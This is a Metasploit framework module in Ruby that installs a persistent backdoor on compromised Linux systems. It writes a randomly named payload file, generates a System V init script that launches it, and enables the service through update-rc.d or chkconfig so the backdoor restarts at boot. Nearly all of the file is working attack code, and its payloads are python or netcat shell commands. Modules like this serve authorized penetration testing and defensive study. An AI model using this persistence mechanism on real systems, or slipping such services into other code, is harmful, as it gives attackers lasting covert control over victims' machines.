##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/service_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Service System V Persistence',
        'Description' => %q{
          This module will create a service via System V on the box, and mark it for auto-restart.
          We need enough access to write service files and potentially restart services
          Targets:
          System V:
          CentOS <= 5
          Debian <= 6
          Kali 2.0
          Ubuntu <= 9.04
          Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die',
          'Cale Black' # systemd user target
        ],
        'Platform' => ['unix', 'linux'],
        'Targets' => [
          [
            'System V', {
              :runlevel => '2 3 4 5',
              'DefaultOptions' => { 'BACKDOOR_PATH' => '/usr/local/bin' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Arch' => ARCH_CMD,
        'References' => [
          ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples'],
          ['URL', 'https://attack.mitre.org/techniques/T1543/']
        ],
        'Payload' => {
          'Compat' =>
          {
            'PayloadType' => 'cmd',
            'RequiredCmd' => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down
          }
        },
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        },
        'DisclosureDate' => '1983-01-01' # system v release date
      )
    )

    register_options(
      [
        # OptPath.new('BACKDOOR_PATH', [true, 'Writable path to put our shell', '/usr/local/bin']), -> WritableDir
        OptString.new('SHELL_NAME', [false, 'Name of shell file to write']),
        OptString.new('SERVICE', [false, 'Name of service to create'])
      ]
    )
    register_advanced_options(
      [
        OptBool.new('EnableService', [true, 'Enable the service', true])
      ]
    )
  end

  def check
    return CheckCode::Safe("#{datastore['WritableDir']} isnt writable") unless writable?(datastore['WritableDir'])

    has_updatercd = command_exists?('update-rc.d')
    if has_updatercd || command_exists?('chkconfig') # centos 5
      return CheckCode::Appears("#{datastore['WritableDir']} is writable and System V based")
    end

    CheckCode::Safe('Likely not a System V based system')
  end

  def install_persistence
    write_shell(datastore['WritableDir'])

    path = backdoor.split('/')[0...-1].join('/')
    file = backdoor.split('/')[-1]

    system_v(path, file, target.opts[:runlevel], command_exists?('update-rc.d'))
  end

  def write_shell(path)
    file_name = datastore['SHELL_NAME'] || Rex::Text.rand_text_alpha(5)
    backdoor = "#{path}/#{file_name}"
    vprint_status("Writing backdoor to #{backdoor}")
    write_file(backdoor, payload.encoded)
    @clean_up_rc << "rm #{backdoor}\n"

    if file_exist?(backdoor)
      cmd_exec("chmod 711 #{backdoor}")
      return backdoor
    end
    fail_with(Failure::NoAccess, 'File not written, check permissions.')
  end

  def system_v(backdoor_path, backdoor_file, runlevel, has_updatercd)
    if has_updatercd
      print_status('Utilizing update-rc.d')
    else
      print_status('Utilizing chkconfig')
    end
    script = %{#!/bin/sh
### BEGIN INIT INFO
# Provides: service
# Required-Start: $network
# Required-Stop: $network
# Default-Start:     #{runlevel}
# Default-Stop:      0 1 6
# Short-Description: Start daemon at boot time
# Description:       Enable service provided by daemon.
### END INIT INFO
dir=\"#{backdoor_path}\"
cmd=\"#{backdoor_file}\"
name=`basename $0`
pid_file=\"/var/run/$name.pid\"
stdout_log=\"/var/log/$name.log\"
stderr_log=\"/var/log/$name.err\"
get_pid() {
    cat \"$pid_file\"
}
is_running() {
    [ -f \"$pid_file\" ] && ps `get_pid` > /dev/null 2>&1
}
case \"$1\" in
    start)
    if is_running; then
        echo \"Already started\"
    else
        echo \"Starting $name\"
        cd \"$dir\"
}

    if has_updatercd
      script << "        sudo $cmd >> \"$stdout_log\" 2>> \"$stderr_log\" &\n"
    else # CentOS didn't like sudo or su...
      script << "        $cmd >> \"$stdout_log\" 2>> \"$stderr_log\" &\n"
    end
    script << %{        echo $! > \"$pid_file\"
        if ! is_running; then
            echo \"Unable to start, see $stdout_log and $stderr_log\"
            exit 1
        fi
    fi
    ;;
    stop)
    if is_running; then
        echo -n \"Stopping $name..\"
        kill `get_pid`
        for i in {1..10}
        do
            if ! is_running; then
                break
            fi
            echo -n \".\"
            sleep 1
        done
        echo
        if is_running; then
            echo \"Not stopped; may still be shutting down or shutdown may have failed\"
            exit 1
        else
            echo \"Stopped\"
            if [ -f \"$pid_file\" ]; then
                rm \"$pid_file\"
            fi
        fi
    else
        echo \"Not running\"
    fi
    ;;
    restart)
    $0 stop
    if is_running; then
        echo \"Unable to stop, will not attempt to start\"
        exit 1
    fi
    $0 start
    ;;
    status)
    if is_running; then
        echo \"Running\"
    else
        echo \"Stopped\"
        exit 1
    fi
    ;;
    *)
    echo \"Usage: $0 {start|stop|restart|status}\"
    exit 1
    ;;
esac
exit 0}

    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
    service_name = "/etc/init.d/#{service_filename}"
    vprint_status("Writing service: #{service_name}")
    write_file(service_name, script)
    if !file_exist?(service_name)
      print_error('File not written, check permissions.')
      return
    end
    @clean_up_rc << "rm #{service_name}\n"
    cmd_exec("chmod 755 #{service_name}")
    print_good('Enabling & starting our service')
    if has_updatercd
      cmd_exec("update-rc.d #{service_filename} defaults")
      cmd_exec("update-rc.d #{service_filename} enable")
      if file_exist?('/usr/sbin/service') # some systems have update-rc.d but not service binary, have a fallback just in case
        cmd_exec("service #{service_filename} start")
      else
        cmd_exec("/etc/init.d/#{service_filename} start")
      end
    else # CentOS
      cmd_exec("chkconfig --add #{service_filename}")
      cmd_exec("chkconfig #{service_filename} on")
      cmd_exec("/etc/init.d/#{service_filename} start")
    end
  end
end
